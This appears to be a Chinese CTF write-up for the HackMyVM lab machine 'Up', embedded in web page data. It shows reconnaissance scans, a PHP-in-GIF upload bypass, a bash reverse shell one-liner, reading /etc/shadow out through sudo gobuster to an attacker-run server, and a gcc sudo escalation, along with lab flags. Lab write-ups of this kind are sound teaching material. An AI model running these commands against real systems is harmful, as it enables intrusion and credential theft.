              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();

1E:60:21 (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 17.22 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这次\u003ccode\u003eUDP\u003c/code\u003e竟然扫出来东西了，\u003ccode\u003emDNS\u003c/code\u003e（Multicast DNS）的默认端口，通常用于 DNS 服务发现\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -sU -min-rate 10000 -p- 192.168.56.31 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:19 EST\nWarning: 192.168.56.31 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.31\nHost is up (0.00090s latency).\nNot shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)\nPORT     STATE SERVICE\n5353/udp open  zeroconf\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 86.07 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -sT -A -T4 -O -p 80 192.168.56.31 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:21 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.31\nHost is up (0.00060s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: RodGar - Subir Imagen\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.60 ms 192.168.56.31\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 21.56 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到目标主机还报告了 \u003cstrong\u003e\u003ccode\u003e80/tcp\u003c/code\u003e\u003c/strong\u003e 上有 \u003ccode\u003eHTTP\u003c/code\u003e 服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -sU -A -T4 -O -p 5353 192.168.56.31\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:22 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.31\nHost is up (0.00069s latency).\n\nPORT     STATE SERVICE VERSION\n5353/udp open  mdns    DNS-based service discovery\n| dns-service-discovery: \n|   80/tcp http\n|_    Address=192.168.56.31 fe80::a00:27ff:fe1e:6021\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\nToo many fingerprints match this host to give specific OS details\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.69 ms 192.168.56.31\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 15.35 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003enmap\u003c/code\u003e漏洞扫描，扫描出了\u003ccode\u003efile-upload\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -script=vuln -p 80 192.168.56.31 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:23 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.31\nHost is up (0.00034s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n| http-fileupload-exploiter: \n|   \n|_    Failed to upload and execute a payload.\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.31\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.56.31:80/\n|     Form \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e: file-upload\n|_    Form action: \n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn'\u003c/span\u003et find any DOM based XSS.\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003ehttp\u003c/code\u003e服务，并检测指纹信息，主页貌似是文件上传功能点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image105.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e文件上传漏洞检测\u003c/h2\u003e\n\u003cp\u003e正常上传照片正常上传的，但是响应包没给出上传路径\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image106.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e前端有文件后缀限制\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;input \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"file-upload\"\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"file\"\u003c/span\u003e name=\u003cspan class=\"hljs-string\"\u003e\"image\"\u003c/span\u003e accept=\u003cspan class=\"hljs-string\"\u003e\".jpg, .jpeg, .gif\"\u003c/span\u003e required\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e先扫一下目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u 192.168.56.31 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,zip,txt,html -b 403,404,502    \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.31\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt\n[+] Negative Status codes:   403,404,502\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip,txt,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 4489]\n/uploads              (Status: 301) [Size: 316] [--\u003e http://192.168.56.31/uploads/]\n/javascript           (Status: 301) [Size: 319] [--\u003e http://192.168.56.31/javascript/]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能扫描到\u003ccode\u003euploads\u003c/code\u003e文件夹，很可能是文件上传的地方，访问一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image107.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e给了一句话，翻译过来就是：\u003ccode\u003e记住，列出所有事项始终是一个好的做法。\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e不明所以，再给你爆一次\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-less\"\u003e⚡ \u003cspan class=\"hljs-selector-tag\"\u003eroot\u003c/span\u003e@\u003cspan class=\"hljs-selector-tag\"\u003ekali\u003c/span\u003e  ~  \u003cspan class=\"hljs-selector-tag\"\u003egobuster\u003c/span\u003e \u003cspan class=\"hljs-selector-tag\"\u003edir\u003c/span\u003e \u003cspan cla ze: 1301]\u003c/span\u003e\n/\u003cspan class=\"hljs-selector-tag\"\u003eclue\u003c/span\u003e\u003cspan class=\"hljs-selector-class\"\u003e.txt\u003c/span\u003e             (\u003cspan class=\"hljs-attribute\"\u003eStatus\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) \u003cspan class=\"hljs-selector-attr\"\u003e[Size: 17]\u003c/span\u003e\n\u003cspan class=\"hljs-selector-tag\"\u003eProgress\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1038215\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e1038220\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100.00%\u003c/span\u003e)\n===============================================================\n\u003cspan class=\"hljs-selector-tag\"\u003eFinished\u003c/span\u003e\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫出来两个文件\u003ccode\u003e/robots.txt\u003c/code\u003e \u003ccode\u003e/clue.txt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/robots.txt\u003c/code\u003e 像一串\u003ccode\u003ebase64\u003c/code\u003e 编码后的字符\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image108.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解码，是上传源码，使用\u003ccode\u003ephp\u003c/code\u003e写的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'REQUEST_METHOD'\u003c/span\u003e] === \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e) {\n    \u003cspan class=\"hljs-variable\"\u003e$targetDir\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"uploads/\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-variable\"\u003e$fileName\u003c/span\u003e = \u003cspan class=\"hljs-built_in\"\u003ebasename\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_FILES\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e\"image\"\u003c/span\u003e][\u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e]);\n    \u003cspan class=\"hljs-variable\"\u003e$fileType\u003c/span\u003e = pathinfo(\u003cspan class=\"hljs-variable\"\u003e$fileName\u003c/span\u003e, PATHINFO_EXTENSION);\n    \u003cspan class=\"hljs-variable\"\u003e$fileBaseName\u003c/span\u003e = pathinfo(\u003cspan class=\"hljs-variable\"\u003e$fileName\u003c/span\u003e, PATHINFO_FILENAME);\n\n    \u003cspan class=\"hljs-variable\"\u003e$allowedTypes\u003c/span\u003e = [\u003cspan class=\"hljs-string\"\u003e'jpg'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'jpeg'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'gif'\u003c/span\u003e];\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (in_array(strtolower(\u003cspan class=\"hljs-variable\"\u003e$fileType\u003c/span\u003e), \u003cspan class=\"hljs-variable\"\u003e$allowedTypes\u003c/span\u003e)) {\n        \u003cspan class=\"hljs-variable\"\u003e$encryptedFileName\u003c/span\u003e = strtr(\u003cspan class=\"hljs-variable\"\u003e$fileBaseName\u003c/span\u003e, \n            \u003cspan class=\"hljs-string\"\u003e'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\u003c/span\u003e, \n            \u003cspan class=\"hljs-string\"\u003e'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'\u003c/span\u003e);\n\n        \u003cspan class=\"hljs-variable\"\u003e$newFileName\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$encryptedFileName\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e\".\"\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$fileType\u003c/span\u003e;\n        \u003cspan class=\"hljs-variable\"\u003e$targetFilePath\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$targetDir\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$newFileName\u003c/span\u003e;\n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (move_uploaded_file(\u003cspan class=\"hljs-variable\"\u003e$_FILES\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e\"image\"\u003c/span\u003e][\u003cspan class=\"hljs-string\"\u003e\"tmp_name\"\u003c/span\u003e], \u003cspan class=\"hljs-variable\"\u003e$targetFilePath\u003c/span\u003e)) {\n            \u003cspan class=\"hljs-variable\"\u003e$message\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"El archivo se ha subido correctamente.\"\u003c/span\u003e;\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable\"\u003e$message\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"Hubo un error al subir el archivo.\"\u003c/span\u003e;\n        }\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-variable\"\u003e$message\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"Solo se permiten archivos JPG y GIF.\"\u003c/span\u003e;\n    }\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e/clue.txt\u003c/code\u003e 给了条路径，不过访问不到，可能到提权的部分有用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image109.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e拿到源码后分析一下，白名单限制设置允许上传的文件类型为 \u003ccode\u003ejpg\u003c/code\u003e、\u003ccode\u003ejpeg\u003c/code\u003e 和 \u003ccode\u003egif\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e文件上传之后对文件名进行字符替换，上传到\u003ccode\u003euploads\u003c/code\u003e文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$encryptedFileName\u003c/span\u003e = strtr(\u003cspan class=\"hljs-variable\"\u003e$fileBaseName\u003c/span\u003e, \n    \u003cspan class=\"hljs-string\"\u003e'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\u003c/span\u003e, \n    \u003cspan class=\"hljs-string\"\u003e'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们上传\u003ccode\u003ea.gif\u003c/code\u003e，根据字符替换后就变成了\u003ccode\u003en.gif\u003c/code\u003e ,访问\u003ccode\u003en.gif\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image110.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功访问到了，我们再上传一次，抓包修改抓包内容。添加\u003ccode\u003ephpinfo()\u003c/code\u003e语句\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image111.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再次访问\u003ccode\u003en.gif\u003c/code\u003e ,\u003ccode\u003ephpinfo()\u003c/code\u003e成功执行了，一般来说白名单绕过只能配合解析漏洞来绕过，但是这里直接执行成功了，估计是服务器配置不当导致的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image112.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e将其替换为提权语句，\u003ccode\u003ekali\u003c/code\u003e开启监听，上传\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php \u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/IP/PORT 0\u003e\u0026#x26;1'\"\u003c/span\u003e);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image113.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后访问\u003ccode\u003en.gif\u003c/code\u003e ，获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nc -lvp 4444                         \nlistening on [any] 4444 ...\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n192.168.56.31: inverse host lookup failed: Host name lookup failure\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.31] 50214\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (739): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nwww-data@debian:/var/www/html/uploads$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=33(www-data) gid=33(www-data) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=33(www-data)\nwww-data@debian:/var/www/html/uploads$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003erodgar\u003c/code\u003e用户家目录可以找到\u003ccode\u003eUserFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@debian:/home/rodgar$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\nb45cffe084dd3d20d928bee\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限可以\u003ccode\u003eroot\u003c/code\u003e权限执行\u003ccode\u003egobuster\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@debian:/home/rodgar$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www-data on debian:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on debian:\n    (ALL) NOPASSWD: /usr/bin/gobuster\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么就可以任意读取文件了，首先在\u003ccode\u003ekali\u003c/code\u003e使用\u003ccode\u003epython\u003c/code\u003e写一个简易服务器，将所有请求都保存在\u003ccode\u003eaccess.txt\u003c/code\u003e里\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// a.py\nfrom flask import Flask, Response, request\n\napp = Flask(__name__)\n\n@app.route(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, defaults={\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e})\n@app.route(\u003cspan class=\"hljs-string\"\u003e'/\u0026#x3C;path:path\u003e'\u003c/span\u003e)\n\u003cspan class=\"hljs-comment\"\u003e# catch_all 处理所有请求\u003c/span\u003e\ndef catch_all(path):\n    \u003cspan class=\"hljs-comment\"\u003e# 获取请求的 URL 和路径\u003c/span\u003e\n    url = request.url\n    path_info = path\n    \n    \u003cspan class=\"hljs-comment\"\u003e# 将 URL 和路径保存到 access.txt\u003c/span\u003e\n    with open(\u003cspan class=\"hljs-string\"\u003e'access.txt'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e) as f:\n        f.write(f\u003cspan class=\"hljs-string\"\u003e\"URL: {url}\\n\"\u003c/span\u003e)\n        f.write(f\u003cspan class=\"hljs-string\"\u003e\"Path: {path_info}\\n\"\u003c/span\u003e)\n        f.write(\u003cspan class=\"hljs-string\"\u003e\"-\"\u003c/span\u003e * 50 + \u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-comment\"\u003e# 根据路径的长度返回相应的状态码\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e len(path) == 31:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Response(status=404)\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Response(status=200)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e:\n    app.run(host=\u003cspan class=\"hljs-string\"\u003e\"0.0.0.0\"\u003c/span\u003e, port=81)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e开启服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython a.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后在靶机使用\u003ccode\u003egobuster\u003c/code\u003e指定字典\u003ccode\u003e/etc/shadow\u003c/code\u003e ,执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://192.168.56.4:81 -w /etc/shadow --exclude-length 0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么这样就能读取到\u003ccode\u003e/etc/shadow\u003c/code\u003e的文件夹了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image114.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e接着尝试读取\u003ccode\u003e/root/root.txt\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@debian:/var/www/html/uploads$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://192.168.56.4:81 -w /root/root.txt --exclude-length 0\n\u0026#x3C;92.168.56.4:81 -w /root/root.txt --exclude-length 0\nError: error on parsing arguments: wordlist file \u003cspan class=\"hljs-string\"\u003e\"/root/root.txt\"\u003c/span\u003e does not exist: \u003cspan class=\"hljs-built_in\"\u003estat\u003c/span\u003e /root/root.txt: no such file or directory\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是提示找不到该文件，想起来上面\u003ccode\u003eweb\u003c/code\u003e的\u003ccode\u003e/clue.txt\u003c/code\u003e 给了条路经\u003ccode\u003e/root/rodgarpass\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们将其作为字典再来一次\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image115.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eb45cffe084dd3d20d928bee85e7b0f2\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行\u003ccode\u003esu\u003c/code\u003e切换，发现认证错误，而且密码看着像是\u003ccode\u003eMD5\u003c/code\u003e ,进行\u003ccode\u003eMD5\u003c/code\u003e爆破\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image116.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解出来为\u003ccode\u003estring\u003c/code\u003e ,再次\u003ccode\u003esu\u003c/code\u003e ，没登陆进去，经提示是作者疏忽\u003ccode\u003e?\u003c/code\u003e将\u003ccode\u003eMD5\u003c/code\u003e值最后少了个\u003ccode\u003e1\u003c/code\u003e （怪不得\u003ccode\u003ejohn\u003c/code\u003e无法破解）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eb45cffe084dd3d20d928bee85e7b0f21\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次切换\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@debian:/home/rodgar$ su rodgar \nsu rodgar\nPassword: b45cffe084dd3d20d928bee85e7b0f21\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1001(rodgar) gid=1001(rodgar) grupos=1001(rodgar)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限，欸嘿，可以直接提权了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e rodgar on debian:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser rodgar may run the following commands on debian:\n    (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMUp/image117.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e gcc -wrapper /bin/sh,-s .\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(root) gid=0(root) grupos=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取\u003ccode\u003eRootFlag\u003c/code\u003e ，\u003ccode\u003eroot\u003c/code\u003e.txt文件被改为了\u003ccode\u003erooo_-tt.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e rooo_-tt.txt\n44b3f261e197124e60217d6ffe7e71a8e0175ae0\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Up","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Up. https://hackmyvm.eu/machines/machine.php?vm=Up Notes: Enjoy. 前期踩点 31是靶机 这次UDP竟然扫出来东西了，mDNS（Multicast DNS）的默认端口，通常用于 DNS 服务发现 可以看到目标主机还报告了 80/tcp 上..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMUp"},"buildId":"C_OyVNnvMZHsIqJ1SCYbH","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
